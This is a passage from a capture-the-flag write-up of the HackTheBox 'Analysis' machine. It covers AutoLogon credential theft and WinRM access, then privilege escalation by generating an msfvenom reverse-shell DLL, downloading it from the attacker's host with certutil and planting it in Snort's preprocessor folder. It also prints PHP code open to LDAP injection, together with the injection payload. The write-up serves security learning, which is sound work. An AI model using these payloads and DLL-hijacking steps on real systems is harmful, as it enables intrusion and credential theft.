❯ cat output.txt
[...SNIP...]
+----------¦ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  analysis.htb.
    DefaultUserName               :  jdoe
    DefaultPassword               :  7y4Z4^*y9Zzj
[...SNIP...]
```

Also, we can see that it works with winrm:

```bash
❯ netexec winrm 10.10.11.250 -u 'jdoe' -p '7y4Z4^*y9Zzj'
WINRM       10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
WINRM       10.10.11.250    5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj (Pwn3d!)
```

So we can evil-winrm to spawn a shell as jdoe and we can see user.txt:

```bash
❯ evil-winrm -i analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\jdoe\Desktop> type user.txt
49a9edaf8a129d8130e3e2e4674a7f82
```

# Access as nt authority/system

In C:, we can see some strange files for some program called Snort:

```powershell
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/12/2023  10:01 AM                inetpub
d-----        11/5/2022   8:14 PM                PerfLogs
d-----         5/8/2023  10:20 AM                PHP
d-----         7/9/2023  10:54 AM                private
d-r---       11/18/2023   9:56 AM                Program Files
d-----         5/8/2023  10:11 AM                Program Files (x86)
d-----         7/9/2023  10:57 AM                Snort
d-r---        5/26/2023   2:20 PM                Users
d-----        1/10/2024   3:52 PM                Windows
-a----         6/8/2024   1:24 PM         291254 snortlog.txt


*Evil-WinRM* PS C:\> cd Snort
*Evil-WinRM* PS C:\Snort> dir


    Directory: C:\Snort


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         7/8/2023   3:31 PM                bin
d-----         7/8/2023   3:31 PM                etc
d-----         7/8/2023   3:31 PM                lib
d-----         6/8/2024   1:22 PM                log
d-----         7/8/2023   3:31 PM                preproc_rules
d-----       12/22/2023  12:54 PM                rules
-a----         7/8/2023   3:31 PM          52666 Uninstall.exe
```

Searching in google, we can see that is a network intrusion detection system.

![What is snort](/assets/images/Analysis/what_is_snort.png)

We also have it's documentation [here](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/)

In the running processes, we can see that snort is running:

```powershell
*Evil-WinRM* PS C:\Snort> Get-Process | where {$_.ProcessName -notlike "svchost*"}
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
[...SNIP...]
    162      18    62696      46652              1864   0 snort
    470      23     5748      16688              2872   0 spoolsv
   2070       0      192        148                 4   0 System
    221      20     3900      12592       0.05   5408   1 taskhostw
    335      17     3648      14584       0.11   2424   1 TextEncode
    216      13     2700      10580       0.08   4124   1 TextEncode
    212      15     2368      10344              3884   0 vds
[...SNIP...]
```

A interesting functionality of snort is [Dynamic modules loading](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html), so let's search for this configuration (`dynamicpreprocessor`) in snort.conf:

```powershell
*Evil-WinRM* PS C:\Snort> cmd /c dir /r /s snort.conf
 Volume in drive C has no label.
 Volume Serial Number is 0071-E237

 Directory of C:\Snort\etc

07/08/2023  09:34 PM            23,094 snort.conf
               1 File(s)         23,094 bytes

     Total Files Listed:
               1 File(s)         23,094 bytes
               0 Dir(s)   4,136,046,592 bytes free
*Evil-WinRM* PS C:\Snort> cd etc
*Evil-WinRM* PS C:\Snort\etc> findstr dynamicpreprocessor snort.conf
dynamicpreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor
```

It's using `C:\Snort\lib\snort_dynamicpreprocessor` as directory to load DLLs, so we can load a malicious DLL and perform a DLL injection because it's running. In the case that the Administrator is who opens snort.exe, we will gain a reverse shell. For this I will use msfvenom:

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp -f dll -o test.dll LHOST=tun0 LPORT=443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: test.dll
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Also, in another window, spawn a nc listener to receive the shell:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...

```

Download the test.dll in the library directory that is used and we receive the shell:

```powershell
*Evil-WinRM* PS C:\Snort\etc> cd ..\lib\snort_dynamicpreprocessor
*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor> certutil.exe -f -urlcache -split http://10.10.14.225/test.dll
****  Online  ****
  0000  ...
  2400
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor> 
```

And we receive the shell as administrateur (which is Administrator in french):

![Administrator shell received](/assets/images/Analysis/administrator_shell_received.png)

Now we can see root.txt:

```powershell

C:\Windows\system32>cd C:\Users\Administrateur
cd C:\Users\Administrateur

C:\Users\Administrateur>cd Desktop
cd Desktop

C:\Users\Administrateur\Desktop>type root.txt
type root.txt
b5****************************e6
```

# Extra

In this section, we will see some of the reasons why this machine was vulnerable. In this case: LDAP injection, AutoLogon and the snort.exe scheduled task.

For this, I will use ConPtyShell for Administrateur shell as we saw before.

## LDAP injection

This is the code where LDAP injection is vulnerable (C:\inetpub\internal\users\list.php):

```php
<?php 

//LDAP Bind paramters, need to be a normal AD User account.
error_reporting(0);
$ldap_password = 'N1G6G46G@G!j';
$ldap_username = 'webservice@analysis.htb';
$ldap_connection = ldap_connect("analysis.htb");

if(isset($_GET['name'])){
    if (FALSE === $ldap_connection) {
        // Uh-oh, something is wrong...
        echo 'Unable to connect to the ldap server';
    }

// We have to set this option for the version of Active Directory we are using. 
    ldap_set_option($ldap_connection, LDAP_OPT_PROTOCOL_VERSION, 3) or die('Unable to set LDAP protocol version');
    ldap_set_option($ldap_connection, LDAP_OPT_REFERRALS, 0); // We need this for doing an LDAP search.

    if (TRUE === ldap_bind($ldap_connection, $ldap_username, $ldap_password)) {

        //Your domains DN to query
        $ldap_base_dn = 'OU=sysadmins,DC=analysis,DC=htb';

        //Get standard users and contacts
        $search_filter = '(&(objectCategory=person)(objectClass=user)(sAMAccountName='.$_GET['name'].'))';


        //Connect to LDAP
        $result = ldap_search($ldap_connection, $ldap_base_dn, $search_filter);

        if (FALSE !== $result) {
            $entries = ldap_get_entries($ldap_connection, $result);

            // Uncomment the below if you want to write all entries to debug somethingthing
            //var_dump($entries);

            //Create a table to display the output
            echo '<h2>Search result</h2></br>';
            echo '<table border = "1"><tr bgcolor="#cccccc"><td>Username</td><td>Last Name</td><td>First Name</td><td>Company</td><td>Department</td><td>Office Phone</td><td>Fax</td><t
d>Mobile</td><td>DDI</td><td>E-Mail Address</td><td>Home Phone</td></tr>';

            //For each account returned by the search 


            //
            //Retrieve values from Active Directory
            //

            //Windows Usernaame
            $LDAP_samaccountname = "";
            $x=0;
            $counter = 1;
            if (!empty($entries[$x]['samaccountname'][0])) {
                $LDAP_samaccountname = $entries[$x]['samaccountname'][0];
                if ($LDAP_samaccountname == "NULL") {
                    $LDAP_samaccountname = "";
                }
                if (strpos($_GET['name'], 'description=') !== false) {
                    $start = strpos($_GET["name"], 'description=');
                    $start += strlen("description=");
                    $end = strrpos($_GET["name"], '*');
                    $password = substr($_GET["name"], $start, $end - $start);
                    $length = strlen($password);
                    for ($i = 0; $i < $length; $i++) {
                        if($entries[$x]['description'][0][$i] != $password[$i]) {
                            $LDAP_uSNCreated = $entries[$x]['usncreated'][0];
                            $LDAP_samaccountname = "CONTACT_";
                            $counter = 0;
                            break;
                        }
                    }
                }
            } else {
                //#There is no samaccountname s0 assume this is an AD contact record so generate a unique username

                $LDAP_uSNCreated = $entries[$x]['usncreated'][0];
                $LDAP_samaccountname = "CONTACT_" . $LDAP_uSNCreated;
            }

            //Last Name
            $LDAP_LastName = "";

            if (!empty($entries[$x]['sn'][0])) {
                $LDAP_LastName = $entries[$x]['sn'][0];
                if ($LDAP_LastName == "NULL") {
                    $LDAP_LastName = "";
                }
            }

            //First Name
            $LDAP_FirstName = "";

            if (!empty($entries[$x]['givenname'][0]) and $counter == 1) {
                $LDAP_FirstName = $entries[$x]['givenname'][0];
                if ($LDAP_FirstName == "NULL") {
                    $LDAP_FirstName = "";
                }
            }

            //Company
            $LDAP_CompanyName = "";

            if (!empty($entries[$x]['company'][0])) {
                $LDAP_CompanyName = $entries[$x]['company'][0];
                if ($LDAP_CompanyName == "NULL") {
                    $LDAP_CompanyName = "";
                }
            }

            //Department
            $LDAP_Department = "";
 
            if (!empty($entries[$x]['department'][0])) {
                $LDAP_Department = $entries[$x]['department'][0];
                if ($LDAP_Department == "NULL") {
                    $LDAP_Department = "";
                }
            }

            //Job Title
            $LDAP_JobTitle = "";

            if (!empty($entries[$x]['title'][0])) {
                $LDAP_JobTitle = $entries[$x]['title'][0];
                if ($LDAP_JobTitle == "NULL") {
                    $LDAP_JobTitle = "";
                }
            } 

            //IPPhone
            $LDAP_OfficePhone = "";

            if (!empty($entries[$x]['ipphone'][0])) {
                $LDAP_OfficePhone = $entries[$x]['ipphone'][0];
                if ($LDAP_OfficePhone == "NULL") {
                    $LDAP_OfficePhone = "";
                }
            }

            //FAX Number
            $LDAP_OfficeFax = "";

            if (!empty($entries[$x]['facsimiletelephonenumber'][0])) {
                $LDAP_OfficeFax = $entries[$x]['facsimiletelephonenumber'][0];
                if ($LDAP_OfficeFax == "NULL") {
                    $LDAP_OfficeFax = "";
                }
            }

            //Mobile Number
            $LDAP_CellPhone = "";

            if (!empty($entries[$x]['mobile'][0])) {
                $LDAP_CellPhone = $entries[$x]['mobile'][0];
                if ($LDAP_CellPhone == "NULL") {
                    $LDAP_CellPhone = "";
                }
            }

            //Telephone Number
            $LDAP_DDI = "";

            if (!empty($entries[$x]['telephonenumber'][0])) {
                $LDAP_DDI = $entries[$x]['telephonenumber'][0];
                if ($LDAP_DDI == "NULL") {
                    $LDAP_DDI = "";
                }
            }

            //Email address
            $LDAP_InternetAddress = "";

            if (!empty($entries[$x]['mail'][0])) {
                $LDAP_InternetAddress = $entries[$x]['mail'][0];
                if ($LDAP_InternetAddress == "NULL") {
                    $LDAP_InternetAddress = "";
                }
            }

            //Home phone
            $LDAP_HomePhone = "";

            if (!empty($entries[$x]['homephone'][0])) {
                $LDAP_HomePhone = $entries[$x]['homephone'][0];
                if ($LDAP_HomePhone == "NULL") {
                    $LDAP_HomePhone = "";
                } 
            }

            echo "<tr><td><strong>" . $LDAP_samaccountname . "</strong></td><td>" . $LDAP_LastName . "</td><td>" . $LDAP_FirstName . "</td><td>" . $LDAP_CompanyName . "</td><td>" . $LD
AP_Department . "</td><td>" . $LDAP_OfficePhone . "</td><td>" . $LDAP_OfficeFax . "</td><td>" . $LDAP_CellPhone . "</td><td>" . $LDAP_DDI . "</td><td>" . $LDAP_InternetAddress . "</td>
<td>" . $LDAP_HomePhone . "</td></tr>";

        } //END FALSE !== $result

        ldap_unbind($ldap_connection); // Clean up after ourselves.
        echo ("</table>"); //close the table

    } //END ldap_bind

}
```

The problem is right here, due to that is not sanitizing any user input, we are able to inject the payload `*)(description=*` and the resulting query is `(&(objectCategory=person)(objectClass=user)(sAMAccountName=*)(description=*))`:


```php
$search_filter = '(&(objectCategory=person)(objectClass=user)(sAMAccountName='.$_GET['name'].'))';
```

That's why we were able to bruteforce valid fields and the description of each user.

# AutoLogon

AutoLogon is a way to make that Windows automatically logs in the computer without you manually having to enter the credentials. You can read more [here](https://www.hackingarticles.in/credential-dumping-windows-autologon-password/). This credentials are stored in registry and that's why we were able to saw it. WinPEAS do it automatically but we can also do it manually with a non-privileged user:

```powershell
*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor> cd HKLM:
*Evil-WinRM* PS HKLM:\> cd "Software\Microsoft\Windows NT\CurrentVersion"
*Evil-WinRM* PS HKLM:\Software\Microsoft\Windows NT\CurrentVersion> Get-Item Winlogon


    Hive: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion


Name                           Property
----                           --------
Winlogon                       AutoRestartShell             : 1
                               Background                   : 0 0 0
                               CachedLogonsCount            : 10
                               DebugServerCommand           : no
                               DefaultDomainName            : analysis.htb.
                               DefaultUserName              : jdoe
                               DisableBackButton            : 1
                               EnableSIHostIntegration      : 1
                               ForceUnlockLogon             : 0
                               LegalNoticeCaption           :
                               LegalNoticeText              :
                               PasswordExpiryWarning        : 5
                               PowerdownAfterShutdown       : 0
                               PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
                               ReportBootOk                 : 1
                               Shell                        : explorer.exe
                               ShellCritical                : 0
                               ShellInfrastructure          : sihost.exe
                               SiHostCritical               : 0
                               SiHostReadyTimeOut           : 0
                               SiHostRestartCountLimit      : 0
                               SiHostRestartTimeGap         : 0
                               Userinit                     : C:\Windows\system32\userinit.exe,
                               VMApplet                     : SystemPropertiesPerformance.exe /pagefile
                               WinStationsDisabled          : 0
                               ShellAppRuntime              : ShellAppRuntime.exe
                               scremoveoption               : 0
                               DisableCAD                   : 1
                               LastLogOffEndTimePerfCounter : 7173375283
                               ShutdownFlags                : 19
                               DisableLockWorkstation       : 0
                               AutoAdminLogon               : 1
                               DefaultPassword              : 7y4Z4^*y9Zzj
                               AutoLogonSID                 : S-1-5-21-916175351-3772503854-3498620144-1103
                               LastUsedUsername             : jdoe
```

# snort.exe

`snort.exe` is being executed by administrator each certain time in order for HackTheBox to simulate that a user is opening it. We can see the ScheduledTask here:

```powershell
# To see the scheduled tasks without showing the ones of windows
PS C:\inetpub\internal\users> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

TaskName                          TaskPath   State 
--------                          --------   -----
CreateExplorerShellUnelevatedTask \          Ready
npcapwatchdog                     \          Ready
run_bctextencoder                 \          Ready
run_simulate                      \        Running
run_snort_check_script            \          Ready

# To get the information of a task, we can use -TaskName parameter of Get-ScheduledTask and use Format-List to dump all data of the object:
PS C:\> Get-ScheduledTask -TaskName "run_snort_check_script" | Format-List                       


Actions            : {MSFT_TaskExecAction}       
Author             : ANALYSIS\Administrateur     
Date               : 2023-07-09T10:51:08.3003508 
Description        :
Documentation      :
Principal          : MSFT_TaskPrincipal2
SecurityDescriptor :
Settings           : MSFT_TaskSettings3
Source             :
State              : Running
TaskName           : run_snort_check_script      
TaskPath           : \
Triggers           : {MSFT_TaskBootTrigger}      
URI                : \run_snort_check_script     
Version            :
PSComputerName     :

# Now to see the Actions (which is the file that executes), we can store the above command in a variable and dump $task.Actions:
PS C:\> $task = Get-ScheduledTask -TaskName "run_snort_check_script"
PS C:\> $task.Actions 


Id               :
Arguments        : -File C:\Users\Administrateur\AppData\Local\Automation\check.ps1 
Execute          : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe        
WorkingDirectory :
PSComputerName   :
```

Now we can see that the file that executes is that powershell script, that looks like this:

```powershell
PS C:\> type C:\Users\Administrateur\AppData\Local\Automation\check.ps1
Stop-Service -Name "Snort"
Get-ChildItem "C:\inetpub\logs\LogFiles\W3SVC2" | Select-String -Pattern "c2_malware_detected" | Select-Object -ExpandProperty path | ForEach-Object {Set-Content -Path $_ -Value $null}
$Foldersize = Get-ChildItem "C:\Snort\log" -recurse | Measure-Object -property length -sum
$Foldersize = [math]::Round(($FolderSize.sum / 1KB),2)
Write-Host $Foldersize

if($Foldersize -gt 0.5){

    Write-Host "detected"
        wget "http://internal.analysis.htb/dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4^*y9Zzj&alert=c2_malware_detected"
    Get-ChildItem -Path C:\Snort\log -Include *.* -File -Recurse | foreach { $_.Delete()}
}

Start-Service -Name "Snort"
```

There, it seems like it detects if in the new logs is the string "c2_malware_detected" and if the foldersize is more than 0.5, it makes a request to `http://internal.analysis.htb/dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4^*y9Zzj&alert=c2_malware_detected`. That's why you will see in some writeups that there is another way to have jdoe password, looking at the log files of inetpub:

```powershell
PS C:\inetpub\logs\LogFiles\W3SVC2> findstr "alert_panel.php" .\u_ncsa1.log
127.0.0.1 - - [08/Jun/2024:13:03:00 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [08/Jun/2024:13:26:12 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [08/Jun/2024:14:10:12 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [08/Jun/2024:14:54:13 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [08/Jun/2024:15:06:12 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [08/Jun/2024:15:12:12 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
```

Note that you have to urldecode the password to convert %5E to ^.

# BCTextEncoder

As we saw above, there is also a task called `run_bctextencoder`, which was the principal idea to convert in Administrateur of the machine. Here, we have to make a lot of debugging and process injection and some very interesting but difficult things to decode the password that is stored in `C:\private\encoded.txt`. If you want to do it, it's available in the official writeup.

Well guys, that's all the machine. Very interesting. Hope you liked it
